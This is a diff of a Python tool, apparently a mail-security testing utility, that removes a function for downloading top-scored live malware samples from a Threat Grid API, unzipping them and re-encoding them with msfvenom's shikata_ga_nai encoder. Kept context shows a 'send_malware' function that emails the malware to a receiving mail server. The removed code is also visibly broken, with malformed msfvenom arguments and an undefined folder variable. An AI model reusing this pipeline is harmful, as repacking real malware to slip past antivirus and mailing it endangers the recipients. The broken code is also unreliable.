@@ -60,69 +60,6 @@ def replaced(mode, sequence, old, new):
     if mode == 'in':
         return (new if old in x else x for x in sequence)
 
-
-def list_to_string(s):
-    str1 = ""
-    for ele in s:
-        str1 += ele
-
-    return str1
-
-
-def get_random_string(stringLength=8):
-    letters = string.ascii_lowercase
-    
-    return ''.join(random.choice(letters) for i in range(stringLength))
-
-
-def malware_refresh(tg_api_key, tg_domain, malware_count):
-    home = str(Path.home())
-    try:
-        with open(tg_api_key, 'r') as file:
-          tg_api_key = file.read().replace('\n', '')
-
-    except FileNotFoundError:
-        print("API Key File Was Not Found")
-        tg_api_key = input("Enter your Threat Grid API Key: ")
-
-    tg_url = 'https://' + tg_domain + '/api/v2/search/submissions'
-    tg_artifact_url = 'https://' + tg_domain + '/api/v2/samples/{}/sample.zip'
-    tg_parameters = {'api_key': tg_api_key,
-                     'advanced':'true',
-                     'state':'succ',
-                     'q':'analysis.threat_score:100',
-                     'sort_by':'submitted_at',
-                     'sort_order':'desc'}
-
-    request = requests.get(tg_url, params=tg_parameters)
-    json_response = request.json()
-
-    for i in range(0,malware_count):
-        sampleid = json_response['data']['items'][i]['item']['sample']
-        print('Using Sample ID: '+sampleid)
-        tg_download_parameters = {'api_key': tg_api_key}
-        request = requests.get(tg_artifact_url.format(sampleid), params = tg_download_parameters)
-        sampleid_value_zip = sampleid + '.zip'
-        open(sampleid_value_zip, 'wb').write(request.content)
-        
-        with ZipFile(sampleid_value_zip, 'r') as zipObj:
-            filenames = zipObj.namelist()
-            zipObj.extractall(pwd=b'infected')
-
-        filename = list_to_string(filenames)
-
-        os.rename(filename, filename + ".exe")
-        print('Repacking File: ' + filename)
-        payloadname = get_random_string()
-        print('Calling msfvenom with filesname ' + payloadname + '.exe')
-        try:
-            subprocess.call(['msfvenom p generic/custom PAYLOADFILE-' + filename + '.exe -a x86 --platform windows -e x86/shikata_ga_nai -f exe -o ' + malware_folder + '/' + payloadname +'.exe'], shell=True)
-        except Exception as e:
-            print('Something went wrong when we asked MSFVenom to repack our malware. Is your install complete?\n' + str(e))
-
-        os.remove(malware_folder + '/' + payloadname + '.exe')
-
-
 def send_malware(sender, msg_recipient, subject, malware, receiving_mta):
      message = MIMEMultipart()
      message["From"] = sender
